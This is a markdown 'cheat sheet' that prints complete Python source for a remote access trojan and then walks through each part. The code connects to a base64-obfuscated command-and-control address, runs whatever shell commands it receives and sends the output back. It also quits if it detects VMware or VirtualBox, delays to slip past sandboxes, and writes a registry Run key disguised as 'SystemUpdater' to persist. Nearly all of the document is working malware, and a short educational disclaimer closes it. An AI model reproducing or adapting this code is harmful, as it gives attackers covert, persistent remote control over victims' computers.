# Remote Access Trojan (RAT) Cheat Sheet (For Educational Purposes)

This cheat sheet details a basic **Python-based Remote Access Trojan (RAT)**. A RAT enables a remote attacker to gain control of a compromised machine, providing the ability to execute commands, exfiltrate data, or install additional payloads.

---

## RAT Overview

A **RAT** is designed to:
- **Establish a Remote Connection**: Connect back to an attacker's server to receive commands.
- **Receive Commands**: Execute shell commands or run scripts as instructed by the attacker.
- **Send Back Data**: Return results to the attacker's server, making it a two-way communication channel.

---

## Key Features in This RAT

1. **Connection Establishment**: Automatically connects back to a specified C2 server.
2. **Command Execution**: Runs system commands sent by the attacker.
3. **Anti-Analysis Evasion**: Checks for sandbox environments and includes a delay to evade detection.
4. **Automatic Dependency Installation**: Installs required Python modules on the compromised machine.
5. **Persistence**: Adds the RAT as a startup item to retain access across reboots.

---

## Advanced Python RAT Code

This code includes automatic dependency checks, stealth techniques, and persistence mechanisms. The RAT listens for incoming commands, executes them, and sends the results back to the attacker.

### Full RAT Code

```python
import os
import sys
import socket
import subprocess
import time
import ctypes
import base64

# Automatically check and install dependencies
def install_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        print(f"[*] Installing {module_name} module...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])

# Ensure required modules are installed
install_module("requests")
import requests

# C2 server details (encoded for obfuscation)
C2_SERVER = base64.b64decode("MTkyLjE2OC4xLjEwOjQ0NDQ=").decode('utf-8')  # Replace with actual IP:port (e.g., "192.168.1.10:4444")

# Virtual environment check
def is_virtual_environment():
    vmware_check = "VMware" in subprocess.getoutput("systeminfo")
    virtualbox_check = "VirtualBox" in subprocess.getoutput("systeminfo")
    return vmware_check or virtualbox_check

# Anti-sandbox delay
time.sleep(10)

# Function to add persistence
def add_persistence():
    try:
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "SystemUpdater"
        rat_path = os.path.realpath(sys.argv[0])
        ctypes.windll.advapi32.RegSetValueExW(ctypes.windll.advapi32.HKEY_CURRENT_USER, key, 0, 1, value_name, rat_path)
        print("[*] Persistence achieved via registry key.")
    except Exception as e:
        print(f"[!] Failed to add persistence: {e}")

# Define the RAT connection and command execution
def rat():
    # Exit if a virtual environment is detected
    if is_virtual_environment():
        print("[!] Virtual environment detected. Exiting.")
        sys.exit(1)
    
    # Add persistence
    add_persistence()

    # Main connection loop
    while True:
        try:
            # Connect to C2 server
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_ip, server_port = C2_SERVER.split(":")
            sock.connect((server_ip, int(server_port)))
            
            # Notify connection success
            sock.send(b"[+] Connection Established\n")
            
            while True:
                # Receive command from C2 server
                command = sock.recv(1024).decode("utf-8")
                if command.lower() == "exit":
                    break
                
                # Execute command and send results back
                output = subprocess.getoutput(command)
                sock.send(output.encode("utf-8") + b"\n")
            
            sock.close()
        except Exception as e:
            print(f"[!] Connection error: {e}")
            time.sleep(5)  # Reconnect delay

# Run the RAT
if __name__ == "__main__":
    rat()
```

---

## Explanation of Key Components

### 1. **Automatic Dependency Installation**

The `install_module()` function ensures that required Python modules are installed, checking for missing dependencies and installing them automatically with `pip`.

```python
def install_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        print(f"[*] Installing {module_name} module...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
```

### 2. **Obfuscated C2 Server Address**

The IP address and port of the command-and-control (C2) server are Base64 encoded to evade static analysis, then decoded at runtime.

```python
C2_SERVER = base64.b64decode("MTkyLjE2OC4xLjEwOjQ0NDQ=").decode('utf-8')  # Replace with actual IP:port
```

### 3. **Virtual Environment Detection**

To detect and avoid sandboxes or virtual environments, the `is_virtual_environment()` function checks for VMware or VirtualBox indicators in `systeminfo`.

```python
def is_virtual_environment():
    vmware_check = "VMware" in subprocess.getoutput("systeminfo")
    virtualbox_check = "VirtualBox" in subprocess.getoutput("systeminfo")
    return vmware_check or virtualbox_check
```

### 4. **Persistence Mechanism**

The RAT uses the Windows registry to add itself to startup, achieving persistence so it will execute every time the system boots.

```python
def add_persistence():
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "SystemUpdater"
    rat_path = os.path.realpath(sys.argv[0])
    ctypes.windll.advapi32.RegSetValueExW(ctypes.windll.advapi32.HKEY_CURRENT_USER, key, 0, 1, value_name, rat_path)
```

### 5. **Main RAT Functionality**

The `rat()` function establishes a connection to the C2 server, receives commands, executes them, and sends results back. If the connection drops, it attempts to reconnect after a short delay.

```python
def rat():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_ip, server_port = C2_SERVER.split(":")
            sock.connect((server_ip, int(server_port)))
            sock.send(b"[+] Connection Established\n")
            
            while True:
                command = sock.recv(1024).decode("utf-8")
                if command.lower() == "exit":
                    break
                
                output = subprocess.getoutput(command)
                sock.send(output.encode("utf-8") + b"\n")
            
            sock.close()
        except Exception as e:
            time.sleep(5)  # Reconnect delay
```

---

## Security and Legal Disclaimer

This RAT code is provided strictly for educational purposes and should only be used in an isolated lab environment with proper authorization. Unauthorized use of malware is illegal and unethical.

```
